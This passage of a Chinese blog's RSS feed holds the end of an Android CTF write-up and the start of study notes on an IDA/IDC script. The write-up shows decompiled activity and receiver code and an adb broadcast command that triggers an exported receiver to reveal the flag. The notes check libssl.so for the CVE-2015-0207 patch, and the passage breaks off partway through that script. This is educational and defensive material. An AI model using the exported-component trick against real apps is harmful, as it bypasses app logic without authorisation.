class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;MainActivity2&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;AppCompatActivity&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Button button;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    EditText editText;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ImageView imageView;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;MainActivity2&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;super&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;init&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.imageView = &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.findViewById(&lt;span class=&#34;number&#34;&gt;0x7F0B0029&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.imageView.setImageResource(&lt;span class=&#34;number&#34;&gt;0x7F020053&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.editText = &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.findViewById(&lt;span class=&#34;number&#34;&gt;0x7F0B0057&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.button = &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.findViewById(&lt;span class=&#34;number&#34;&gt;0x7F0B0056&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;onCreate&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Bundle arg3)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;super&lt;/span&gt;.onCreate(arg3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.setContentView(&lt;span class=&#34;number&#34;&gt;0x7F04001B&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.init();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.button.setOnClickListener(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;View$OnClickListener&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;onClick&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(View arg4)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                MainActivity2.&lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.sendBroadcast(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Intent&lt;/span&gt;(MainActivity2.&lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.editText.getText().toString()));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;到那时我并不是很理解这些代码都是什么意思。我猜测 imageView 是与我们的图像有关，而且下面我看到了 click，会将我们输入的字符串广播发送，发送对象是谁呢？这里我不是很清楚，但是这是一个 intent 类（intent 应该是一个广播报文，用于组件之间的数据传递）. 在 manifest 中见过，注册了接收器 ——com.example.test.ctf02.GetAndChange，然后我去搜索了一下 intentfilter 是一个白名单过滤器，注册的时候。声明了广播的注册，接收者，以及白名单 “android.is.very.fun”。所以这里的显示码就是这个白名单。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;E:%5CmyBLOG%5Cblog%5Csource_posts%5Cadworld-%E5%9F%BA%E7%A1%80%E7%9A%84android%5Cimage-20220718160715646.png&#34; alt=&#34;image-20220718160715646&#34;&gt;&lt;/p&gt;
&lt;p&gt;虽然到这里我们拿到了 flag。&lt;/p&gt;
&lt;h2 id=&#34;进一步&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#进一步&#34;&gt;#&lt;/a&gt; 进一步&lt;/h2&gt;
&lt;p&gt;广播接收器在接收到 intent 之后进行了什么？&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;GetAndChange&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;BroadcastReceiver&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;GetAndChange&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;super&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;onReceive&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Context arg3, Intent arg4)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        arg3.startActivity(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Intent&lt;/span&gt;(arg3, NextContent.class));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;他这里又打开了 NextContent，这里出现了两个.jpg 图像，第一个就是我们最开始看到的，而第二个是一个压缩文件，所以这里的逻辑应该就是去处理这所文件，然后进行替换显示，我们在 assets 中看到了压缩文件，也就是 flag 的图片。&lt;/p&gt;
&lt;p&gt;但是到这里，就结束了吗？我们看这个接收器的声明，export 属性是允许其他应用调用当前的组件，所以这个如果这个广播我们可以直接发送，就会直接拿到 flag。所以我们怎么进行广播？一个师傅的做法是利用 adb 调试器，发送如下指令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;adb shell am broadcast -a android.is.very.fun&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;解析一下，就是 adb 执行 shell，这个 am 不是很理解，然后 adb shell am 又可以添加一下命令和选项，其中 broadcast 就是广播，-a 是选项允许监听交互的一些通信，最后加上 intent, 这样接收器就可以接收到信息了。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/06/27/%E5%AD%A6%E4%B9%A0%E5%91%A8%E8%AE%B0-%E2%80%94%E2%80%94%E4%B8%80/</guid>
            <title>学习周记 ——一</title>
            <link>http://example.com/2022/06/27/%E5%AD%A6%E4%B9%A0%E5%91%A8%E8%AE%B0-%E2%80%94%E2%80%94%E4%B8%80/</link>
            <category>二进制学习</category>
            <pubDate>Mon, 27 Jun 2022 21:06:06 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;task&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#task&#34;&gt;#&lt;/a&gt; TASK:&lt;/h1&gt;
&lt;p&gt;​		编写 IDA 脚本，不依赖版本号的条件下，利用二进制特征，在 openssl 的 libssl.so 中检查 CVE-2015-0207 和 CVE-2014-3507 是否被修补&lt;/p&gt;
&lt;p&gt;要求：idc 和 python 两个版本都写一下，这个就是把 libssl.so 拖进 ida，然后运行你的脚本，然后弹窗或者输出有没有那两个 cve 存在&lt;/p&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaGV4LXJheXMuY29tL3Byb2R1Y3RzL2lkYS9zdXBwb3J0L2lkYWRvYy8xNjIuc2h0bWw=&#34;&gt;https://www.hex-rays.com/products/ida/support/idadoc/162.shtml&lt;/span&gt;				按字母顺序排列的 IDC 函数列表&lt;/p&gt;
&lt;p&gt;不依赖版本号，就是使用 ida 通用的函数，&lt;/p&gt;
&lt;h2 id=&#34;前置diff-dapatch&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前置diff-dapatch&#34;&gt;#&lt;/a&gt; 前置：diff dapatch&lt;/h2&gt;
&lt;h2 id=&#34;对于数据的定义&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#对于数据的定义&#34;&gt;#&lt;/a&gt; 对于数据的定义&lt;/h2&gt;
&lt;p&gt;ida 各版本通用的是划分为，整数 long，字符串 string，以及浮点数，而不做具体的划分。或者使用无定形的关键字 auto，定义一个变量。但是在模块中，我们还是要局部变量先声明。可以在任何地方都可以定义定义一个全局变量，关键字为 extern，但是不能在声明的同时，进行赋值。&lt;/p&gt;
&lt;h2 id=&#34;运算&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#运算&#34;&gt;#&lt;/a&gt; 运算&lt;/h2&gt;
&lt;p&gt;idc 不支持复合赋值运算，比如 i+=2 这样，但是支持三元运算符（？：）。&lt;/p&gt;
&lt;h2 id=&#34;数据处理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据处理&#34;&gt;#&lt;/a&gt; 数据处理：&lt;/h2&gt;
&lt;p&gt;idc 这种脚本程序，最重要的就是数据的获取以及处理，idc 库提供了相关的数据获取与处理的函数&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;读取内存数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;Byte&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; addr)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;Word&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; addr)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;Dword&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; addr)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;修改内存数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;Patchbyte&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; addr)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;Patchword&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; addr)&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;PatchDword&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(longword)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//修改数据的时候，如果提供的数据长度不匹配，从低地址开始有效&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;isLoaded&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; addr)&lt;/span&gt;;	&lt;span class=&#34;comment&#34;&gt;//地址是否包含有效数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;用户交互输入输出&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户交互输入输出&#34;&gt;#&lt;/a&gt; 用户交互 —— 输入输出&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;E:%5CmyBLOG%5Cblog%5Csource_posts%5C%E5%AD%A6%E4%B9%A0%E5%91%A8%E8%AE%B0-%E2%80%94%E2%80%94%E4%B8%80%5Cimage-20220629233503199.png&#34; alt=&#34;image-20220629233503199&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以物品们尽量使用 Message 函数进行输出 ma ?&lt;/p&gt;
&lt;h2 id=&#34;处理函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#处理函数&#34;&gt;#&lt;/a&gt; 处理函数&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//获取目标地址 *所在* 函数的名字&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;string	GetFunctionName(long addr);	//如果addr不属于一个函数，则返回一个空字符串&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;long	NextFunction(long addr);	//返回addr的下一函数的起始地址，失败返回-1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;long	PrevFunction(long addr);	//返回addr的之前距离最近的函数的起始地址，失败返回-1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;long	LocByName(string name);	//根据名字查找函数的起始地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//宏定义，非法地址   BADADDR&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//交叉引用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;task1cve-2015-0207&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#task1cve-2015-0207&#34;&gt;#&lt;/a&gt; task1:CVE-2015-0207&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;-- a/ssl/d1_lib.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+++ b/ssl/d1_lib.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;dtls1_listen&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(SSL *s, &lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; sockaddr *client)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+    &lt;span class=&#34;comment&#34;&gt;/* Ensure there is no state left over from a previous invocation */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+    SSL_clear(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     SSL_set_options(s, SSL_OP_COOKIE_EXCHANGE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     s-&amp;gt;d1-&amp;gt;listen = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;检测是否修复漏洞，就是看看 dtls1_listen 函数是否调用了 SSL_clear 函数。&lt;/p&gt;
&lt;p&gt;定位到 dtls1_listen 函数的位置，遍历他的每一条指令，筛选出函数调用指令的交叉引用，所以我们需要便利的同时进行排除选择，检查交叉引用的返回值，筛选出 fl_CN 或者 fl_CF 类型的交叉引用。然后判断，调用函数的名称是否为 SSL_clear.&lt;/p&gt;
&lt;p&gt;idc 脚本&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;idc.idc&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;auto&lt;/span&gt; func,end,target,inst,name,flags,xref;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    flags = SEARCH_DOWN | SEARCH_NEXT;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Message(&lt;span class=&#34;string&#34;&gt;&amp;quot;now ,let&amp;#x27;s begin!\n\n\n*********************\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    func = LocByName(&lt;span class=&#34;string&#34;&gt;&amp;quot;dtls1_listen&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(func == BADADDR)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Warning(&lt;span class=&#34;string&#34;&gt;&amp;quot;Sorry we cannnot find dtls1_listen in the database!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        end = GetFunctionAttr(func,FUNCATTR_END);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        name = Name(func)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(inst = func; inst &amp;lt;end;inst = 